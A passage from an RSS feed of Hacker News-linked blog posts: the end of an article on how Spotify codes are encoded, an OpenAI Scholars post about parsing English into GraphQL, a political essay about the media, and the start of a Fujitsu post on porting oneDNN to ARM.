</code></pre></div><p>The barcode consists of 23 bars, of which only 20 actually contain information. This means that there are <code>8^20</code> pieces of information that can be encoded into the code.</p><h2 id="uris-to-barcodes">URIs to Barcodes</h2><p>How do you convert a <code>63^22</code> bit URI into an <code>8^20</code> bit barcode? There is <code>2.3e+21</code> times as much information in the URI than there is in the barcode. This is when I started asking questions and hunting for answers. <a href="https://stackoverflow.com/questions/47267924/string-encryption-generate-unique-pattern-like-spotify-codes/62120952#62120952">This question</a> was a start, but I ended up asking <a href="https://stackoverflow.com/questions/62121301/encoding-spotify-uri-to-spotify-codes">this SO question</a> and getting a couple of answers that linked to the relevant patents and contained more info about Spotifyâ€™s look up table.</p><p><a href="https://data.epo.org/publication-server/rest/v1.0/publication-dates/20190220/patents/EP3444755NWA1/document.pdf">Here is one patent</a>.</p><p><a href="http://www.freepatentsonline.com/20180181849.pdf">Here is another, more recent patent</a></p><blockquote><p>â€œPatents are the worstâ€ - Peter Boone</p></blockquote><p>Let me just say: patents are the worst. They are so dense. I used to think academic papers were full of jargon until I read some technical patents.</p><h3 id="the-process">The Process</h3><p>When you visit <a href="https://www.spotifycodes.com/">Spotify codes</a> and input a Spotify URI, a â€œmedia referenceâ€ is created by Spotify. This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotifyâ€™s database (a look-up table) to determine what URI it corresponds to. A Stack Overflow user <a href="https://stackoverflow.com/a/63479041/10703868">discovered</a> that you can sniff the request that your phone makes when scanning the barcode to determine the media reference and API endpoint.</p><div><pre><code data-lang="python">heights <span>=</span> [<span>0</span>, <span>2</span>, <span>6</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>0</span>]
media_reference <span>=</span> <span>"67775490487"</span>
uri <span>=</span> <span>"spotify:user:jimmylavallin:playlist:2hXLRTDrNa4rG1XyM0ngT1"</span>
</code></pre></div><p>There are a few steps required to turn a media reference into a Spotify code (and vis versa).</p><h3 id="cyclic-redundancy-check">Cyclic Redundancy Check</h3><p>A <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">Cyclic redundancy check</a> is calculated for the media ref. Based on the fact that 8 bits are calculated, I am assuming Spotify uses CRC8.</p><div><pre><code data-lang="python"><span>import</span> crc8

hash <span>=</span> crc8<span>.</span>crc8()
media_ref <span>=</span> <span>67775490487</span>
ref_bytes <span>=</span> media_ref<span>.</span>to_bytes(<span>5</span>, byteorder<span>=</span><span>"big"</span>)
<span>print</span>(ref_bytes)
<span># b'\x0f\xc7\xbb\xe9\xb7'</span>
hash<span>.</span>update(ref_bytes)
check_bits <span>=</span> hash<span>.</span>digest()
<span>print</span>(check_bits)
<span># b'\x0c'</span>
</code></pre></div><p>Append the crc to the media reference:</p><div><pre><code data-lang="python">media_reference <span>=</span> <span>b</span><span>'</span><span>\x0f\xc7\xbb\xe9\xb7\x0c</span><span>'</span>
</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a â€œnoisyâ€ communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents donâ€™t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: itâ€™s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I wonâ€™t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are â€œwrongâ€ if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error â€¦</strong></p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</a></em></p>]]>
            </description>
            <link>https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156104</guid>
            <pubDate>Fri, 20 Nov 2020 00:30:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Semantic Parsing English to GraphQL]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156093">thread link</a>) | @acarrera94
<br/>
November 19, 2020 | https://blog.lambdo.com/spegql-openai-scholars-final-project/ | <a href="https://web.archive.org/web/*/https://blog.lambdo.com/spegql-openai-scholars-final-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>The OpenAI scholars program requires a final open source project. I've been eagerly working on it and I'm happy to present it now. Along with this blog post, my final presentation, code and an academic paper, I present &nbsp;<strong>Semantic Parsing English-to-GraphQL </strong>(SPEGQL). </p><p>I presented this project in my final project proposal. So in this post, I'll cover some of the highlights. The full details can be found in <a href="https://docs.google.com/document/d/1EmAFC2LGxu8zG3LI6vMt8SrGpjwYtBpnDqCtj_AnDJQ/edit?usp=sharing">this paper</a>. &nbsp;</p><h3 id="background">Background</h3><p><strong>GraphQL</strong></p><p><a href="https://graphql.org/">GraphQL</a> is a query language for your api.</p><p>It's become very popular recently because of several reasons. It represents the schema as a graph, nested relations of any depth can be easily queried, it can aggregate data over multiple datasources and responses are predictable among other things.</p><p><strong>Semantic Parsing</strong></p><p>Semantic parsing is the task of converting a natural language utterance to a logical form: a machine-understandable representation of its meaning. In this case I wanted to semantically parse English to GraphQL.<br></p><p>Why this project?</p><p>I had a few reasons to work on this project:</p><ul><li>I wanted to understand the limits of general language models for Semantic Parsing</li><li>This project could potentially ease the learning curve for new developers of GraphQL </li><li>Potential tooling for non technical data users such as managers to gain insights into their data</li></ul><h2 id="objective">Objective</h2><p>Given an English prompt:</p><blockquote><em>â€œWhat is the name and date of the song released most recently?â€</em></blockquote><p>And some GraphQL Schema</p><pre><code>type song {
 artist: artist
 artist_name: String
 country: String
 f_id: Int
 file: files
 genre: genre
 genre_is: String
 languages: String
 rating: Int
 releasedate: String
 resolution: Int
 song_name: String
}

...
</code></pre>
<p>Find a corresponding GraphQL Query: </p><pre><code>query {
 song(limit: 1, order_by: {releasedate: desc}) {
   song_name
   releasedate
 }
}
</code></pre>
<p>This objective could be tested by passing the prompt and schema though a model to output a query. The process is as follows: </p><figure><img src="https://res.cloudinary.com/dukk4p2n1/image/fetch/q_auto,f_auto,dpr_auto/https://blog.lambdo.com/content/images/2020/07/Screen-Shot-2020-07-02-at-12.13.09-PM.png" loading="lazy"></figure><h2 id="methods">Methods</h2><p>The process required multiple steps</p><ol><li>Create an English to GraphQL dataset</li><li>Run experiments on Encoder-Decoder Transformer models (Bart and T5)</li><li>Collect data and results</li><li>Implement a graphical interface to interact with the model</li></ol><h2 id="results">Results</h2><ul><li>46 - 50% exact set matching accuracy on GraphQL validation dataset</li></ul><p>A couple of example videos will help show results as well </p><figure><iframe width="459" height="344" src="https://www.youtube.com/embed/OG8ZdSkF2BA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>A query is generated for a schema and question.</figcaption></figure><figure><iframe width="459" height="344" src="https://www.youtube.com/embed/HE9Q52THeJY?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>The model is able to generalize to new, different schemas it was not trained on.&nbsp;</figcaption></figure><p>That is a short overview of my project. </p><p>Here is the main Repo for creating and validating the Dataset:</p><p><a href="https://github.com/acarrera94/sql-to-graphql">https://github.com/acarrera94/sql-to-graphql</a></p><p>I also created an example notebook for anyone who wants to try out the model. This model is finetuned on GraphQL and SQL and can create queries for both languages:</p><p><a href="https://colab.research.google.com/drive/1l1h8RlEl-IS0XfkDh66qikH4UsD19KF6?usp=sharing"></a><a href="https://drive.google.com/uc?id=1H026ff-czIdLH3saJzbWUH8VKOW3j63X"></a><a href="https://colab.research.google.com/drive/1XdPrjtnr4e-O7imQEjDQ9XhCVaurR2Mf?usp=sharing"></a><a href="https://colab.research.google.com/drive/1XdPrjtnr4e-O7imQEjDQ9XhCVaurR2Mf?usp=sharing">https://colab.research.google.com/drive/1l1h8RlEl-IS0XfkDh66qikH4UsD19KF6?usp=sharing</a></p><p>I'm currently working on a paper that details the whole process, that's linked <a href="https://docs.google.com/document/d/1EmAFC2LGxu8zG3LI6vMt8SrGpjwYtBpnDqCtj_AnDJQ/edit?usp=sharing">here</a>.</p><p>And finally, I also gave a presentation about my project at OpenAI: </p><figure><a href="https://openai.com/blog/openai-scholars-spring-2020-final-projects/"><div><p>OpenAI Scholars Spring 2020: Final Projects</p><p>Our third class of OpenAI Scholars [/blog/openai-scholars-spring-2020/] presented their final projects at virtual Demo Day, showcasing their research
results from over the past five months. These projects investigated problems
such as analyzing how GPT-2 represents grammar, measuring the interpretaâ€¦</p><p><img src="https://openai.com/favicon.png"><span>OpenAI</span></p></div><p><img src="https://openai.com/content/images/2020/07/openai-scholars-gradient-horizontal-stacked-2.png"></p></a></figure>
</div></div>]]>
            </description>
            <link>https://blog.lambdo.com/spegql-openai-scholars-final-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156093</guid>
            <pubDate>Fri, 20 Nov 2020 00:28:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What's Wrong with the Media]]>
            </title>
            <description>
<![CDATA[
Score 20 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25156088">thread link</a>) | @jger15
<br/>
November 19, 2020 | https://www.slowboring.com/p/whats-wrong-with-the-media | <a href="https://web.archive.org/web/*/https://www.slowboring.com/p/whats-wrong-with-the-media">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Welcome to Thursday! </p><p>Iâ€™ve been reading some interesting policy reports about everything from <a href="https://t.co/CxLqshzCAg">maternal mortality</a> to <a href="https://www.urban.org/urban-wire/can-we-design-student-loan-forgiveness-target-low-income-families">how to target student loan forgiveness</a> but at the moment there is a lot of demand for me to address the situation at Vox in detail or to assimilate my personal story into a larger narrative about â€œwokenessâ€ or the culture wars. Personally Iâ€™m not a huge fan of navel-gazing. So Iâ€™ll just say that my personal interest in reclaiming my status as an independent, blog-like voice transcends any particular issues with any particular publication. I wanted to do <em>this,</em> not go find a different job, and I thank those of you whoâ€™ve joined me on this journey.</p><p>But Vox is typical of a few trends that exist broadly in the media industry and that I do think are of interest. </p><ul><li><p>The staff skews very young. </p></li><li><p>The staff is concentrated in big coastal cities, and especially New York.</p></li><li><p>The staff is overwhelmingly composed of graduates of selective colleges (state university flagship campuses and private schools with names you know).</p></li></ul><p>The media industry has long skewed young, educated, and New Yorky. But digital disruption trends have made it more so than ever before. Daily newspapers published in mid-sized cities and small towns are weaker and less significant. A lot of reporters born in the 1960s and 1970s have left the industry as it has shrunk and few of them work at digital native startups. </p><p>Separately from that change, national politics has been polarizing around age, educational attainment and population density in an unprecedented way. A group of young, recent college graduates living in Brooklyn wouldâ€™ve skewed left in 1990 but this was an era when Al Dâ€™Amato could win statewide in New York and Democratic presidential campaigns would win in West Virginia. Today a demographically identical group skews much further left than it used to. None of this is really an outcome that anyone particularly wanted or intended. But itâ€™s put a big thumb on the scales ideologically at the exact same time that economic trends have turned against the startups.</p><p>The result is that I think you should expect the instability weâ€™ve seen this fall to be just the leading edge of the wedge.  </p><h4>Most media isnâ€™t political journalism </h4><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fce695ac4-18ca-4c53-a705-9cfd4bf75644_1616x1168.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fce695ac4-18ca-4c53-a705-9cfd4bf75644_1616x1168.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/ce695ac4-18ca-4c53-a705-9cfd4bf75644_1616x1168.png&quot;,&quot;height&quot;:1052,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2381922,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a><figcaption>Culture criticism today: Calling out various problematic things</figcaption></figure></div><p>Reeves Wiedemanâ€™s recent <a href="https://nymag.com/intelligencer/2020/11/inside-the-new-york-times-heated-reckoning-with-itself.html">article about internal tensions at The New York Times</a> includes this passage, which gets at a dynamic that I think you see across the media landscape. The vast majority of the people who work at any given publication are not professional political journalists, and generally the further you get from the ~~political journalism~~ section of a media organization the more left-wing things get: </p><blockquote><p>Of all the fronts on which the Times was being pushed to change, the strongest insurrectionary energy was coming from legions of newsroom-adjacent employees in digital jobs that didnâ€™t exist a decade ago. The employees responsible for distributing the Times in the past â€” typesetters, pressmen, delivery drivers â€” had never been encouraged to speak up about the ethical questions at the heart of the paperâ€™s journalism. But the app developers and software engineers who deliver the Timesâ€™ journalism to the world have held their hands up in just as many Ivy League seminars as their editorial peers. They might be too shy to march over to a masthead editor and complain about a clumsy headline, but #newsroom-feedback had opened a digital door to criticism. Reporters found that suddenly it was the Timesâ€™ programmers and developers, rather than their editors, who were critiquing their work. During the town hall about the Cotton op-ed, one data engineer said on Slack, â€œHow many such process failures would be tolerated in tech?â€</p><p>Many of the techsurrectionists had come from Facebook or Uber or Amazon to join the Times out of a sense of mission, leaving the ethical quandaries of the tech industry for what they thought were more virtuous pastures. â€œI joined the company for one reason, and itâ€™s because I feel a responsibility to be a part of a mission that I believe in,â€ a product manager who previously worked at Apple wrote in #newsroom-feedback after the Cotton op-ed. â€œThis feels like the rugâ€™s been pulled out from under us â€” not just because it feels like that mission [has] been severely compromised by the decision to publish this piece, but even more so because the products weâ€™re building were used to do it.â€</p><p>â€œItâ€™s like making telephone poles,â€ one software engineer added, â€œand finding out theyâ€™re being used as battering rams.â€</p></blockquote><p>People who cover politics professionally, for better or worse, end up spending a fair amount of time talking to Republicans and trying to understand what conservatives think about public policy issues. If weâ€™re doing our jobs at all correctly we can do stories that bring a mostly-progressive audience a greater understanding of what is happening on the other side. And when a professional political reporter does a bad job itâ€™s often because he or she is taking a dive to maintain relationships with sources on the right, or bending over <em>too far</em> backwards to be fair. </p><p>At the same time, we political journalists have our fair share of totally ignorant hot takes about music or cooking or sports or whatever else that we can fire off. </p><p>The flip side is that our colleagues who cover sports or music or cooking also have hot takes about politics. Hot takes that come from the very narrow demographic and ideological niche that dominates the media and is untempered by the need to actually cover politics.</p><h4>Coverage has gotten really weird </h4><p>Ian Walker <a href="https://kotaku.com/playstation-5-the-kotaku-review-1845588904">recently ended his PS5 review for Kotaku with this thought</a>: </p><blockquote><p>The world is still reeling under the weight of the covid-19 pandemic. There are more Americans out of work right now than at any point in the countryâ€™s history, with no relief in sight. Our health care system is an inherently evil institution that forces people to ration life-saving medications like insulin and choose suicide over suffering with untreated mental illness.</p><p>As Iâ€™m writing this, it looks very likely that Joe Biden will be our next president. But itâ€™s clear that the worst people arenâ€™t going away just because a new old white man is sitting behind the Resolute deskâ€”well, at least not&nbsp;<em>this</em>&nbsp;old white man. Our government is fundamentally broken in a way that necessitates radical change rather than incremental electorialism.</p><p>The harsh truth is that, for the reasons listed above and more, a lot of people simply wonâ€™t be able to buy a PlayStation 5, regardless of supply. Or if they can, concerns over increasing austerity in the United States and the growing threat of widespread political violence supersede any enthusiasm about the consoleâ€™s SSD or how ray tracing makes reflections more realistic. Thatâ€™s not to say you&nbsp;<em>canâ€™t</em>&nbsp;be excited for those thingsâ€”I certainly am, on some levelâ€”but thereâ€™s an irrefutable level of privilege attached to the ability to simply tune out the world as it burns around you.</p></blockquote><p>The problem here, to me, is not that Walker ought to â€œstick to sports.â€ Itâ€™s that the analysis is bad. But because itâ€™s in a video game console review rather than a policy analysis section and conforms to the predominant ideological fads, it just sails through to our screens. </p><p>What actually happened is that starting in March the household savings rate soared (people are taking fewer vacations and eating out less) and while itâ€™s been declining from its peak as of September it was still unusually high.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F885debb5-4601-4e59-9232-382c5c1f8250_1494x718.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F885debb5-4601-4e59-9232-382c5c1f8250_1494x718.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/885debb5-4601-4e59-9232-382c5c1f8250_1494x718.png&quot;,&quot;height&quot;:700,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:94064,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>One result of this is a lot of people have been able to pay off old debts. At the same time, interest rates have plunged without sparking an increase in borrowing, so household debt service costs have plummeted. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9dcbf3aa-9fc1-4e00-b528-26e07108ac28_1494x702.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F9dcbf3aa-9fc1-4e00-b528-26e07108ac28_1494x702.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/9dcbf3aa-9fc1-4e00-b528-26e07108ac28_1494x702.png&quot;,&quot;height&quot;:684,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:109636,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>The upshot of this is that no matter what you think about Biden or the American health care system, the fact is that the sales outlook for a new video game console system is very good. There is economic hardship in America, but the larger trend is that middle class people are seeing their homeownersâ€™ equity rise and their debt payments fall, while cash piles up on their balance sheets, because itâ€™s not safe to throw a big birthday party or take a vacation this weekend.</p><p>Not to just pick on this one article, but it was striking to me because it was both emblematic of the way far-left politics has suffused non-political media and also because the topic had nothing to do with race or gender identity issues.  </p><h4>Itâ€™s not really about â€œwokenessâ€</h4><p>Thereâ€™s a lot of talk lately about excessive â€œwokenessâ€ in the media driving people away from their jobs. But I donâ€™t really think the underlying dynamics are specific to any particular issue area. </p><p>I remember a time in December 2018 when there was a <a href="https://www.vox.com/the-goods/2018/11/26/18112769/amazon-prime-cancel">flurry of articles about an Amazon Prime backlash</a> and I felt inspired to write a corrective noting that <a href="https://www.vox.com/policy-and-politics/2018/12/11/18129809/amazon-polling-popular-confidence">Amazon is actually incredibly popular</a> both as a shopping destination and in polls. In response to a similar barrage of articles about how <a href="https://www.vanityfair.com/style/2020/04/how-should-a-climate-change-reporter-think-about-having-children">maybe you shouldnâ€™t have children because of climate change</a>, I felt inspired to write, at somewhat greater length, my book One Billion Americans. </p><p>The basic dynamic is that if you take a normal distribution (say of political views) and then shift the average a bit to one side, you end up with explosive growth in the number of outliers. In this chart, the average of the red line isnâ€™t so different from the average of the black line. But the right-hand tail of the red line is much higher than the black.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa5804a44-7e3d-4e75-a0b7-4115b0f9cdee_999x461.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa5804a44-7e3d-4e75-a0b7-4115b0f9cdee_999x461.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a5804a44-7e3d-4e75-a0b7-4115b0f9cdee_999x461.jpeg&quot;,&quot;height&quot;:461,&quot;width&quot;:999,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:85183,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>If everyone in digital media is an under-fifty college graduate living in a big city, then itâ€™s not that everyone in digital media is a far-left weirdo, but you do get <em>drastically more</em> far-left weirdness. </p><p>This tendency could obviously be tempered by business considerations. Hollywood is famously full of left-wing people and they do produce some content that reflects those ideas. But they mostly produce content that lacks overt political themes, and they also feed the network television audience a steady diet of police procedurals that embed very â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.slowboring.com/p/whats-wrong-with-the-media">https://www.slowboring.com/p/whats-wrong-with-the-media</a></em></p>]]>
            </description>
            <link>https://www.slowboring.com/p/whats-wrong-with-the-media</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156088</guid>
            <pubDate>Fri, 20 Nov 2020 00:27:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fujitsu contributes ARMv8/SVE support to Intel's oneDNN library]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25155872">thread link</a>) | @fomine3
<br/>
November 19, 2020 | https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en | <a href="https://web.archive.org/web/*/https://blog.fltech.dev/entry/2020/11/19/fugaku-onednn-deep-dive-en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
        <div id="main-inner">
          


          
  
  <!-- google_ad_section_start -->
  <!-- rakuten_ad_target_begin -->
  
  
  

  

  
    
      
        <article id="entry-26006613653622863" data-keyword-campaign="" data-uuid="26006613653622863" data-publication-type="entry">
  <div>
    

    


    <div>
  
    <p><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201119/20201119120325.png" alt="f:id:fltech:20201119120325p:plain" title="" itemprop="image"></span></p>

<h2>Introduction</h2>

<p>Hello everyone. This is <a href="https://github.com/kawakami-k">Kawakami</a> from the Fujitsu Laboratories Platform Innovation project. The new Fugaku supercomputer has been delivered to Port Island located off the coast of Kobe. Developed jointly by RIKEN and Fujitsu, this supercomputer has entered the trial run phase this year ahead of schedule. As of June, it has already won four "firsts" in worldwide supercomputer rankings (<a href="https://www.fujitsu.com/global/about/resources/news/press-releases/2020/0622-01.html">TOP500, HPCG, HPL-AI</a>, <a href="https://www.fujitsu.com/global/about/resources/news/press-releases/2020/0622-02.html">Graph500</a>), so it is off to a very promising start. My department is involved in researching and developing techniques to accelerate deep learning (DL) processes on Fugaku and PRIMEHPC FX1000/700, which is our product that uses the same CPU as Fugaku. In this post, I will talk about our efforts to port oneDNN (library software used to accelerate DL processes) to Fugaku, and to contribute and incorporate our source code into Intel's main branch of oneDNN.</p>

<h2>Software stack for deep learning processes</h2>

<p>Applications that make use of deep learning processes (hereinafter called Ã¢â‚¬Å“DL processesÃ¢â‚¬ï¿½) normally consists of a software stack formed from two layers: a framework layer and a library layer (as shown below). When a user wants to run an application that uses a DL process, they use an API provided by the framework to define the neural network for the process to run and to describe processing details. The framework calls library software functions and calculates the actual DL process based on the provided definition and process details. The systems that run DL processes come in various forms and sizes (such as supercomputers, the cloud, PCs, and smartphones), and the hardware in the system that is actually running the process might be a CPU or GPU. By separating the software stack into two layers like this, different systems and hardware executing the DL process are merged in the library layer, so users can use the same framework. This is beneficial because it allows for the same ease of use for all users with regard to defining networks and describing processes.</p>

<figure title="Software stack for deep learning processes"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072431.png" alt="f:id:fltech:20201117072431p:plain" title="" itemprop="image"></span><figcaption>Software stack for deep learning processes</figcaption></figure>

<p>Individually optimized library software is available to maximize system and hardware performance. This software is normally developed by the vendors who develop and manufacture the hardware. For example, Intel and NVIDIA have developed and made available libraries for Intel CPUs and NVIDIA GPUs, respectively. Fugaku and FX1000/700 are equipped with A64FX CPUs, which offer an expanded instruction set called Scalable Vector Extension (SVE) for High Performance Computing on top of the Armv8-A instruction set (the same CPU found in Android smartphones and iPhones). A64FX is the first CPU in the world to offer both the Armv8-A instruction set and the SVE instruction set (hereinafter, they are referred as Ã¢â‚¬Å“Armv8-A instruction setÃ¢â‚¬ï¿½ together), so there was no DL process library optimized for this CPU.</p>

<h2>Development of a DL process library for the Arm architecture</h2>

<p>There was no DL process library for the Armv8-A instruction set, so we needed to develop a new one. However, even if we at Fujitsu developed a new library on our own, users would not use it unless it could easily be used from the framework. We therefore decided to use the oneDNN DL library, developed by Intel for the x64 instruction set, as a reference implementation. oneDNN is the de facto standard for DL process libraries using CPUs, and it is already supported by a range of frameworks. A deep learning library for Armv8-A that includes APIs for oneDNN could therefore be used without a user having to modify a framework.</p>

<p>The source code for oneDNN has been released as <a href="https://github.com/oneapi-src/oneDNN">OSS (https://github.com/oneapi-src/oneDNN)</a>, so it can be obtained and recompiled for the Armv8-A instruction set. However, oneDNN contains many implementations optimized at the assembler level for the x64 instruction set, so simply recompiling the original source code would not provide enough performance. This was the start of our difficulties. We will discuss this later in this post.</p>

<p>The chart below is an example of the increases in processing speed we obtained through optimizing code for Armv8-A. oneDNN can be used to run a range of processes used in DL processing, such as convolution, batch_normalization, eltwise, pooling, and reorder. The chart below compares the processing speed for the reorder process (in which data types are converted or reordered) when the oneDNN source code is compiled without modification for the Armv8-A instruction set, and when the source code is compiled after our optimizations were implemented. The software processing speed obtained with the original oneDNN source code compiled without modification is normalized as a value of 1. As shown in the chart, we were able to increase the speed up to 400 times over, depending on the type of test pattern (although our optimizations actually decreased the speed for several test patterns, there would be no problem when using this together with a framework due to the small absolute values in measurement errors and processing times). Optimizing code for A64FX also resulted in extraordinary processing speed increases in other processes as well.</p>

<figure title="Measurement speed up of reorder processing"><span itemscope="" itemtype="http://schema.org/Photograph"><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/f/fltech/20201117/20201117072157.png" alt="f:id:fltech:20201117072157p:plain" title="" itemprop="image"></span><figcaption>Measurement speed up of reorder processing</figcaption></figure>

